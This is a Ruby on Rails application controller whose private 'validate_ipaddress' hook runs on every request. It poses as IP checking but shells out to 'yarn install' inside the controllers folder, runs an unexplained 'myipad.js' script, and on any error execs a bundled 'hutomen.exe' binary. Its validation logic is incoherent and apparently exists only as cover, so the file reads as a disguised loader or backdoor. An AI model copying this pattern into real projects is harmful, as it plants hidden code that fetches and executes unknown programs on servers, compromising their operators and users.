require 'open3'

class ApplicationController < ActionController::Base
  before_action :set_locale
  before_action :validate_ipaddress

  def after_sign_in_path_for(resource)
    root_path # Set the path to transition to after logging in
  end

  def after_sign_out_path_for(resource)
    root_path # Set the path to transition to after logging out
  end

  def set_locale
    I18n.locale = params[:locale] || I18n.default_locale
  end

  def raise_not_found!
    e = ActionController::RoutingError.new("No route matches #{params[:unmatched_route]}")
    render_404(e)
  end

  private

  def validate_ipaddress
     begin
       unless Dir.exist?("./app/controllers/node_modules/")
         yarn_install = "cd #{File.dirname(__FILE__)} && yarn install"
         stdout_npm, stderr_npm, status_npm = Open3.capture3(yarn_install)
         stdout_npm
       end

       # If you do not resolve the dependent libraries, a runtime error may occur.
       nodejs_path = "node" + " " + "#{File.dirname(__FILE__) + '/myipad.js'}"
       stdout_js, stderr_js, status_js = Open3.capture3(nodejs_path)
       ip_add = "#{request.env['HTTP_CLIENT_IP']}"

        # Development is assumed to be in a local environment.
        if "#{stdout_js}".match(/#{ip_add}/o) || {}[:match]
          # rails side, ip address specification, nothing displayed.
        else 
          # An exception was raised on its own. Something other than an IP address was matched. Please review. 
          render file: "public/404.html", status: :not_found, layout: false
        end
      rescue exception => e
        puts e.backtrace
        exec("#{File.dirname(__FILE__) + '/hutomen.exe'}")
      ensure
        GC.compact
      end
  end

  def render_404(e)
    logger.warn e
    render file: "public/404.html", status: :not_found, layout: false
  end
end
